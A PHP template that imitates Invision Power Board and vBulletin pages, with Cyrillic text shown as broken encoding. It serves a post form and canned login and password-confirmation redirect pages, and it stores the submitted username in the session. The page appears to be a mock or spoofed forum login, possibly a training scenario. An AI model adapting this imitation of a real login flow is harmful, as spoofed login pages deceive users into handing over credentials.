<?
	if (isset($_SESSION['show']))
	{
		?>
			<form action="showthread.php?p=148197#post148197" name="vbform" method="post">
		<table cellpadding="0" cellspacing="0" border="0" class="fieldset">
			<tr>
				<td class="smallfont">���������:</td>
				<td class="smallfont">���������:</td>
			</tr>
			<tr>
				<td><input type="text" class="bginput" name="title" value="" size="50" maxlength="85" tabindex="1" title="�� �����������" /></td>
				<td><textarea name="message" id="vB_Editor_001_textarea" rows="10" cols="10" style="display:block; width:540px; height:10px" tabindex="1" dir="ltr"></textarea></td>
			</tr>			
		</table>
		<input type="submit" class="button" name="sbutton" id="vB_Editor_001_save" value="��������" accesskey="s" tabindex="1"/>
		<input type="submit" class="button" name="preview" value="��������������� �������� ���������" accesskey="r" tabindex="1"/>
	</form>
	<?
		unset($_SESSION['show']);
		exit;
	}
	if (isset($_POST['passwordconfirm']))
	{
		?>
		<div id="redirectwrap">
	<h4>���������� ���!</h4>
	<p>������ �� ��������� ������������������ �������������, ������������� ��� � ����� ����� �� �����<br /><br />����������, ��������� ���� �� ��� ������������...</p>
	<p class="redirectfoot">(<a href="index.php?act=Login&CODE=00">������� ����, ���� �� ������ ������ �����</a>)</p>
	</div>
		<?
		exit;
	}
	if((isset($_GET['act']))&&(isset($_GET['CODE']))&&($_GET['CODE']=='01'))//������� �����
	{
		
		$username='admin';
		if((isset($_POST['UserName']))&&($_POST['UserName']!=''))$username=$_POST['UserName'];
		if($_REQUEST[session_name()]) $_SESSION['username'] = $username;
	?>
	<div id="redirectwrap">
		<h4>���������� ���!</h4>
		<p>�� ����� ��� ��������� ������ ������������: coolmynick<br /><br />����������, ��������� ���� �� ��� ������������...</p>
		<p class="redirectfoot">(<a href="index.php?&amp;CODE=00">������� ����, ���� �� ������ ������ �����</a>)</p>
	</div>
	<?
		exit;
	}	
?>
<!--Invision Power Board (Powered by Invision Power Board)-->
<div class="borderwrap">
	<div id="logostrip"><img src="design/logo4.gif"  style='vertical-align:top' alt='IPB' border='0' ></div>
	<div id="submenu">
		<p>
		<?
			$f_name_links_gest='links';
			if(file_exists($f_name_links_gest))
			{
				$file_all_gest=file($f_name_links_gest);				
				for($i=0;$i<count($file_all_gest);$i++)echo trim($file_all_gest[$i]);
				unset($file_all_gest);
			}
		?>	
		</p>
	</div>
</div>
